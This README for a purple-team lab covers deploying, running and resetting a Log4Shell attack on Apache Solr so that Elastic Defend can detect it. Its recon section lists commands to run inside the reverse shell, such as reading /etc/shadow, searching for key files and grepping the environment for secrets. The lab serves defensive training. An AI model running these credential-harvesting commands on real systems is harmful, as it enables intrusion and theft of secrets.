# SIEM Demo — Operation Bad Memories

Purple team exercise: Log4Shell (CVE-2021-44228) exploitation of Apache Solr, detected by Elastic Defend, triaged by an Elastic Workflow using AI agents.

## Prerequisites

1. Deploy infrastructure: `cd terraform && terraform apply --auto-approve`
2. This runs cloud-init (Solr), Elastic Agent enrollment, workflow deployment, and detection rule creation automatically.

## Run the Demo

### Full test cycle (recreates Solr VM, installs agent, runs exploit, verifies alert)

```bash
./terraform/scripts/test-cycle.sh
```

### Reset VMs only (prepare a clean environment without running the attack)

```bash
./terraform/scripts/reset-solr-red-vm.sh
```

Recreates the solr-kb VM, installs Elastic Agent, and waits for event collection. Prints the attack command to run when you're ready.

### Run just the attack (against existing Solr VM)

```bash
SSH_KEY=state/ssh-key.pem
ATTACKER=$(cd terraform && terraform output -raw redteam_public_ip)
TARGET=$(cd terraform && terraform output -json host_private_ips | jq -r '.["solr-kb"]')
ATTACKER_PRIV=$(cd terraform && terraform output -raw redteam_private_ip)

ssh -i $SSH_KEY ubuntu@$ATTACKER "bash /home/ubuntu/scripts/host-scan.sh -t $TARGET -a $ATTACKER_PRIV"
```

### Reconnaissance commands (once in the reverse shell)

After the reverse shell connects, you'll be dropped into an interactive session on the target. Try these typical red team recon commands:

```bash
# Identity and privilege
id
whoami
sudo -l

# Host info
hostname
uname -a
cat /etc/os-release

# Network reconnaissance
ifconfig
ip addr
ss -tlnp
netstat -rn
cat /etc/resolv.conf
cat /etc/hosts

# Process and service enumeration
ps aux
ps aux | grep solr
env

# File system and sensitive data
pwd
ls -la /
ls -la /home
cat /etc/passwd
cat /etc/shadow
find / -name "*.properties" -type f 2>/dev/null
find / -name "*.xml" -path "*/solr/*" 2>/dev/null

# Credential and secret hunting
cat /opt/solr/server/etc/jetty.xml
find / -name "*.pem" -o -name "*.key" 2>/dev/null
env | grep -i pass
env | grep -i key
```

### Redeploy workflow only (after editing YAML or agents)

```bash
./terraform/scripts/deploy-workflow.sh
```

### Teardown workflows and cases

```bash
./terraform/scripts/teardown-workflow-and-cases.sh
```
